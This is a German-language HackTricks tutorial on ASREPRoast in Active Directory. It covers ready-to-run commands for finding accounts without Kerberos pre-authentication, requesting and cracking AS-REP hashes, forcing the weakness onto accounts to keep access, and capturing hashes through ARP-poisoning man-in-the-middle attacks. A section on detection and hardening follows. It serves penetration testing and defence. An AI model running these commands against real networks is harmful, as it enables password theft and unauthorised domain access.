# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ist ein Sicherheitsangriff, der Benutzer ausnutzt, bei denen das Attribut **Kerberos pre-authentication required** fehlt. Diese Schwachstelle ermöglicht es Angreifern im Wesentlichen, beim Domain Controller (DC) eine Authentifizierung für einen Benutzer anzufordern, ohne das Passwort des Benutzers zu benötigen. Der DC antwortet anschließend mit einer Nachricht, die mit einem aus dem Passwort des Benutzers abgeleiteten Schlüssel verschlüsselt ist. Angreifer können versuchen, diese Nachricht offline zu knacken, um das Passwort des Benutzers zu ermitteln.

Die wichtigsten Voraussetzungen für diesen Angriff sind:

- **Fehlende Kerberos pre-authentication**: Bei den Zielbenutzern darf dieses Sicherheitsfeature nicht aktiviert sein.
- **Verbindung zum Domain Controller (DC)**: Angreifer benötigen Zugriff auf den DC, um Anfragen zu senden und verschlüsselte Nachrichten zu empfangen.
- **Optionales Domain-Konto**: Ein Domain-Konto ermöglicht es Angreifern, gefährdete Benutzer durch LDAP-Abfragen effizienter zu identifizieren. Ohne ein solches Konto müssen Angreifer Benutzernamen erraten.

#### Aufzählung gefährdeter Benutzer (Domain-Anmeldedaten erforderlich)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP-Nachricht anfordern
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus fordert standardmäßig **RC4** an, daher zeigt die Ereignis-ID **4768** normalerweise **preauth type 0** und **ticket encryption type 0x17**. Wenn du **`/aes`** hinzufügst (oder RC4 für das Ziel deaktiviert ist), erwarte stattdessen **AES etypes**.<sup>[[2]](#references)</sup>

#### Schnelle One-Liner (Linux)

- Potenzielle Ziele zuerst auflisten (z. B. aus geleakten Build-Pfaden) mit Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Eine vollständige Benutzernamensliste ohne gültige Credentials mit NetExec roasten: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Wenn du Credentials hast, lasse NetExec LDAP abfragen und jeden roastbaren Account für dich anfordern: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Wenn die Ausgabe mit **`$krb5asrep$23$`** beginnt, knacke sie mit Hashcat **`-m 18200`**. Wenn sie mit **`$krb5asrep$17$`** oder **`$krb5asrep$18$`** beginnt, bevorzuge John **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Gehe nicht davon aus, dass jeder AS-REP roast RC4 verwendet. Moderne Tools können abhängig vom angeforderten bzw. ausgehandelten Enctype **RC4** (`$krb5asrep$23$`) oder **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) zurückgeben. **`hashcat -m 18200`** ist für **etype 23** gedacht, während **John** `krb5asrep` direkt für **17/18/23** verarbeitet.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistenz

Erzwinge, dass **preauth** für einen Benutzer nicht erforderlich ist, für den du über **GenericAll**-Berechtigungen (oder Berechtigungen zum Schreiben von Eigenschaften) verfügst:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Erkennung und Härtung

Ein erfolgreiches Roasting erzeugt auf dem DC ein **4768**-Ereignis mit `Status=0x0` und `PreAuthType=0`. Setze RC4 bei der Erkennung nicht voraus: `TicketEncryptionType=0x17` ist ein nützliches Signal für schwache Verschlüsselung, aber ein Angreifer kann AES anfordern (Ereignisprotokollwerte `0x11`/`0x12`). Unter Windows Server 2016 und höher mit dem kumulativen Update vom 14. Januar 2025 (oder neuer) zeigt Version 2 des Ereignisses 4768 außerdem `ClientAdvertizedEncryptionTypes`, die vom Konto/DC unterstützten Etypes und die verfügbaren Schlüssel an.<sup>[[5]](#references)</sup>

Eine praktische Suche markiert einen Client, der ausschließlich RC4 ankündigt, obwohl das Konto über AES-Schlüssel verfügt, und korreliert Bursts von einer Quell-IP über mehrere Benutzer ohne Preauth. Erstelle eine Baseline für legitime Ausnahmen, statt bei jedem Ereignis mit `PreAuthType=0` einen Alarm auszulösen.

Die dauerhafte Lösung besteht darin, **Do not require Kerberos preauthentication** bei jedem Benutzer zu deaktivieren, der dies nicht unbedingt benötigt, und die Passwörter offengelegter Konten zu rotieren. Wenn eine Ausnahme nicht entfernt werden kann, verwende ein langes, zufällig generiertes Passwort und minimale Berechtigungen. Das Deaktivieren von RC4 erhöht den Cracking-Aufwand, beseitigt jedoch nicht die Anfälligkeit für Roasting, da AES-AS-REP-Antworten weiterhin offline geknackt werden können.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast ohne Credentials

Ein On-Path-Angreifer kann das AS-REP abfangen, das während eines normalen, vorab authentifizierten AS-Austauschs zurückgegeben wird, und dessen verschlüsselten Teil für Offline-Cracking formatieren. Anders als beim klassischen ASREPRoasting erfordert dies nicht `DONT_REQ_PREAUTH`; es liefert jedoch nur Konten, deren Kerberos-Austausch tatsächlich abgefangen wird. **ASRepCatcher** erlangt standardmäßig die Position durch einseitiges ARP-Poisoning oder kann mit `--disable-spoofing` Datenverkehr aus einer anderen MitM-Technik übernehmen.<sup>[[6]](#references)</sup>\
Wenn du den verwandten Trick ohne Credentials sehen möchtest, der von einem No-Preauth-Principal ein **service ticket** statt eines **TGT** zurückgibt, siehe [Kerberoast](kerberoast.md).

Im `relay`-Modus leitet [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) abgefangene AS-REQs weiter und erzwingt **RC4**, wenn beide Seiten dies noch zulassen. `listen` verändert keine Pakete und erfasst daher den Enctype, den Client und DC ausgehandelt haben. Beschränke das Poisoning nach Möglichkeit mit `-t`/`-tf`, statt das gesamte Subnetz zu beeinflussen.<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Ereignis 4768: Ein Kerberos-Authentifizierungsticket wurde angefordert](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
